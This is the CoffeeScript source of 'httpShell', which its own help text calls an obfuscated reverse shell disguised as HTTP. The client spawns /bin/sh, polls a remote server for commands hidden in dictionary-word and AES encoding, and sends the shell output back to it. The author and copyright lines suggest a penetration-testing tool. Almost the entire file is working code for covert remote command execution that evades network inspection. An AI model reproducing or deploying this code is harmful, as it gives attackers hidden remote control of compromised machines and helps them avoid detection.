fs = require 'fs'
http = require 'http'
{spawn} = require 'child_process'
program = require './includes/commander.js'
{transcoder} = require './includes/transcoder'

class server
        constructor: (@host,@port,@delay,@password,@client_dict,@server_dict)->
                console.log "Running as server\n"
                #setup transcoders
                @ct = new transcoder @client_dict, @password
                @st = new transcoder @server_dict, @password

                @to_client = ''

                #setup the stdin to receive input from user
                process.stdin.resume()
                process.stdin.setEncoding 'utf8'
                #when we get a command from the user we encode and send it to the client
                process.stdin.on 'data', (data) =>
                        to_client += @st.encode data
                #If they want a shell, we'll give them a prompt :D
                process.stdout.write "\nhttpshell# "
                #Create an HTTP server to listen for reponses from client
                http.createServer (request,response) =>
                        request.setEncoding 'utf8'
                        from_client = ''
                        #when we get data we add it to a queue to send to the user
                        #we do it this way rather than printing it directly to make sure that
                        #chunked data shows up all at once
                        request.on 'data', (data) =>
                                from_client += @ct.decode data
                        #If the connection closes improperly, we just keep going
                        request.on 'close', =>
                                if from_client? and from_client != ''
                                        process.stdout.write from_client
                                        process.stdout.write 'httpShell# '
                                response.end @to_client
                                @to_client = ''
                        #When the http request is finished we decode and print the data back to the user
                        request.on 'end', =>
                                if from_client? and from_client != ''
                                        process.stdout.write from_client
                                        process.stdout.write 'httpShell# '
                                response.end @to_client
                                @to_client = ''
                .listen port


class client
        constructor: (@host,@port,@delay,@password,@client_dict,@server_dict)->
                console.log "Running as client\n"
                #setup transcoders
                @ct = new transcoder @client_dict, @password
                @st = new transcoder @server_dict, @password

                @to_return = ""
                #Spawn a shell as a subprocess
                @sh = spawn '/bin/sh'
                @sh.stdout.setEncoding 'utf8'
                @sh.stderr.setEncoding 'utf8'
                #When the shell gives us data we send it to the server
                @sh.stdout.on 'data', (data) =>
                        @to_return += data
                @sh.stderr.on 'data', (data) =>
                        @to_return += data
                #We periodically send a request to the server to see
                #if there are more commands to run.
                setInterval =>
                        options = {host:@host,port: @port,path: '/',method: 'POST'}
                        req = http.request options, (res) ->
                                res.setEncoding 'utf8'
                                res.on 'data', (data) ->
                                        if data? and data != ''
                                                decoded = @st.decode data
                                                @sh.stdin.write decoded
                        #we do the response on a timeout so the shell has time to generate a response
                        setTimeout (req) =>
                                req.write @ct.encode(@to_return)
                                req.end()
                        ,500,req
                ,@delay
                

#Read a file. Each line in the file will be an element in a dictionary.
readbyline = (path) ->
        data = fs.readFileSync path,'utf8'
        #figure out enline
        data = data.split('\r\n')
        data = data[0].split('\n') if data.length == 1
        output = []
        for i in [0...data.length]
                d = data[i]
                for j in [0...data.length]
                        #make sure we don't have duplicate or overlapping elements. can't have 'goodbye' and 'bye'
                        d = if data[j].indexOf(data[i]) is -1 or j is i then d else ""
                output = if d isnt "" then output.concat(d) else output
        output

#Help Message / Description...
helpme = \
"\  Name:\n\t\
        httpShell - obfuscated reverse shell that looks like HTTP\n\n\

  Description:\n\t\
        This is an obfuscated client/server reverse shell. \n\n\t\

        If running as client, this application will act like an HTTP client (web browser),\n\t\
        making HTTP requests to the server. These requests will be encoded using the dictionary\n\t\
        files specified by the user. These requests will contain the results of the bash commands\n\t\
        send in the HTTP responses.\n\n\t\

        If running as the server, this application will act like an HTTP server, answering HTTP requests\n\t\
        sent by the client or by actual web browsers. The HTTP responses will bash commands encoded\n\t\
        into the dictionary file specified by the user.\n\n\

  Author:\n\t\
        Written by Ben Toews (mastahyeti)\n\n\

  Copyright:\n\t\
        Copyright © 2011 Neohapsis Inc. License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.\n\t\
        This is free software: you are free to change and redistribute it.  There is NO WARRANTY, to the extent permitted by law."

#Default Options
client_dict = ['hello','world']
server_dict = ['hello','world']
port = 80
host = "127.0.0.1"
delay = 1000 #time between connections
password = 'supersecret'

#Setup the options parsing
program.version('0.0.2')
program.option '-h --host [address]',"Server IP address or domain name [#{host}](Client/Server)",host
program.option '-p --port [port]',"Server listening port [#{port}] (Client/Server)",port
program.option '-d --delay [delay-ms]',"Miliseconds to delay between requests [#{delay}](Client only)",delay
program.option '-s --secret [shared]',"Shared secret to use for aes192 encryption [#{password}](Client/Server)",password
program.option '-a --dict <filename>','Path to the dictionary file to use for both client and server (Client/Server)'
program.option '-b --clientdict <filename>','Path to the dictionary to use for client communication (Client/Server)'
program.option '-c --serverdict <filename>','Path to the dictionary to use for server communication (Client/Server)'
program.option '-q --quiet','Run quietly. (Client only)'
program.on '--help', ->
	console.log helpme
program.parse process.argv

#Should we shut up?
if program.quiet?
	console.log = (string) ->
		return

#Absorb the options
host     = program.host
port     = program.port
delay    = program.delay
password = program.secret 

#Parse the dictionary file argument
if program.dict?
        dict = readbyline program.dict
        client_dict = dict
        server_dict = dict

#Parse the client dictionary file argument
if program.clientdict?
        client_dict = readbyline program.clientdict

#Parse the server dictionary file argument
if program.serverdict?
        server_dict = readbyline program.serverdict

#let the user know whats up
console.log "We will be using the following options:"
console.log "host             : #{host}"
console.log "port             : #{port}"
console.log "delay            : #{delay}"
console.log "password         : #{password}"
console.log "client dictionary: #{client_dict}"
console.log "server dictionary: #{server_dict}\n"


